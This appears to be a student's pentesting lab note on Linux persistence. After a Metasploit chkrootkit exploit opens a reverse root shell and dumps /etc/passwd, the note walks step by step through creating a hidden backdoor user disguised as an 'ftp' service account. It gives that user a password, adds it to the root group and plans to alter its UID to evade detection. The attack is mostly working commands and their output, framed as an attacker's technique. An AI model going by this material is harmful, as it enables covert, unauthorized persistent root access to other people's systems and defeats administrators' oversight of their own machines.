

1. Creating a backdoor user with such a name that it dosenlt look like a backdoor
    - we can use a name which looks more like a service accunt then a user account
2. Add this user to group which root user is part of

3. Now we ca use our backdoor user to SSH into target whenever we want , hence we established a Persistence

# This is one of the manual technichue , there are many other manual ways also

***********************************************************************************************************************
# Consider we gained Privilege Esclated by vulnerable `chkrootkit` and continue from there

msf5 exploit(unix/local/chkrootkit) > run

[*] Started reverse TCP double handler on 192.51.30.2:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo qpZMuK83lNNcOCS2;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "qpZMuK83lNNcOCS2\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 3 opened (192.51.30.2:4444 -> 192.51.30.3:44770) at 2024-01-11 14:06:40 +0000
[+] Deleted /tmp/update

/bin/bash -i
bash: cannot set terminal process group (26): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~# whoami
whoami
root
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
root@victim-1:~# 

# The first thing we need to keep in mind when we create a backdoor user is that user should be as clandestine as possible and should blend-in, which means we typically should give username which is very difficult to be identified and it should seem more like a service account rather than user account

Lets create a user with name `ftp` and also create its home diectory and shell

A typical service account has a home dir like `/var/abc/def` and has a shell like `/usr/sbin/nologin`

┌──(root㉿kali)-[/]
└─# `useradd -m ftp -s /bin/bash`

# We can proovide password we want for the user                                                                                                                                                                                                                                        
┌──(root㉿kali)-[/]
└─# `passwd ftp`
New password: 
Retype new password: 
passwd: password updated successfully

# we then have our user
                                                                                                                                                                                                                                  
┌──(root㉿kali)-[/]
└─# `cat /etc/passwd`
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
tss:x:101:109:TPM software stack,,,:/var/lib/tpm:/bin/false
strongswan:x:102:65534::/var/lib/strongswan:/usr/sbin/nologin
tcpdump:x:103:110::/nonexistent:/usr/sbin/nologin
usbmux:x:104:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:107:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:108:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:109:114:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:110:117::/var/lib/saned:/usr/sbin/nologin
lightdm:x:111:118:Light Display Manager:/var/lib/lightdm:/bin/false
polkitd:x:996:996:polkit:/var/lib/polkit-1:/usr/sbin/nologin
rtkit:x:112:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
colord:x:113:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
nm-openvpn:x:114:122:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
nm-openconnect:x:115:123:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
mysql:x:116:124:MySQL Server,,,:/nonexistent:/bin/false
stunnel4:x:995:995:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
_rpc:x:117:65534::/run/rpcbind:/usr/sbin/nologin
geoclue:x:118:126::/var/lib/geoclue:/usr/sbin/nologin
Debian-snmp:x:119:127::/var/lib/snmp:/bin/false
sslh:x:120:129::/nonexistent:/usr/sbin/nologin
ntpsec:x:121:132::/nonexistent:/usr/sbin/nologin
redsocks:x:122:133::/var/run/redsocks:/usr/sbin/nologin
rwhod:x:123:65534::/var/spool/rwho:/usr/sbin/nologin
iodine:x:124:65534::/run/iodine:/usr/sbin/nologin
miredo:x:125:65534::/var/run/miredo:/usr/sbin/nologin
statd:x:126:65534::/var/lib/nfs:/usr/sbin/nologin
redis:x:127:134::/var/lib/redis:/usr/sbin/nologin
postgres:x:128:135:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mosquitto:x:129:136::/var/lib/mosquitto:/usr/sbin/nologin
inetsim:x:130:137::/var/lib/inetsim:/usr/sbin/nologin
_gvm:x:131:139::/var/lib/openvas:/usr/sbin/nologin
king-phisher:x:132:140::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:,,,:/home/kali:/usr/bin/zsh
ftp:x:1001:1001::/home/ftp:/bin/bash

# We can add this user to group that root user belongs to, this will inherit root user privileges to our user ftp
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/]
└─# `groups root`
root : root
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/]
└─# `usermod -aG root ftp  `     
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/]
└─# `groups ftp` 
ftp : ftp root


# Now we can use this user to diretly SSH into target

# The only thing which we need to sharpen in this techninue is to make our created user hide in sauch a way that it dosent get detected

- for this we made it look like service account

- another thing is that our user's user id is the 1001 and which obviously seems its recently created so we can change userid also